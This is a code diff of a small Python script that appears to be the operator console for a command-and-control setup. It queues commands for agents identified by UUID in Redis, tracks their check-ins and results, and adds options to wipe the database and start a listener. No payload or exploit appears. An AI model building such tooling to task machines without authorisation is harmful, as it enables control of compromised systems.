@@ -1,4 +1,4 @@
-import listener
+import subprocess
 import redis
 from datetime import datetime
 import json
@@ -7,14 +7,15 @@ import json
 
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
 
-def updateCommand(uuid, command):
-    conn.hset('UUID', uuid, command)
+def clearDB():
+    for key in conn.scan_iter("*"):
+        conn.delete(key)
 
 def searchUUID(uuid):
     print(conn.hget('UUID', uuid))
 
 while True:
-    inp = input('(1)Enter command / (2)Search by UUID / (3)List all')
+    inp = input('(1)Enter command / (2)Search by UUID / (3)Clear DB / (4)Start a listener / (5)List all')
     if inp == '1':
         uuid = input('UUID: ')
         comm = input('Command: ')
@@ -29,7 +30,7 @@ while True:
         structure = {
             "Command": f"{comm}",
             "LastInteraction": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
-            "LastCheckIn": f"{LastCheckIn}",
+            "LastCheckIn":f"{LastCheckIn}",
             "Result": "0"
         }
         structure = json.dumps(structure)  # Dump the json
@@ -38,6 +39,10 @@ while True:
     elif inp == '2':
         uuid = input('UUID: ')
         searchUUID(uuid)
+    elif inp == '3':
+        clearDB()
+    elif inp == "4":
+        subprocess.Popen(["python3", "listener.py"])
     else:
         #print(conn.keys()) # UUID is the key but we want values from the key
         print(conn.hgetall('UUID')) # We're searching by hash values here
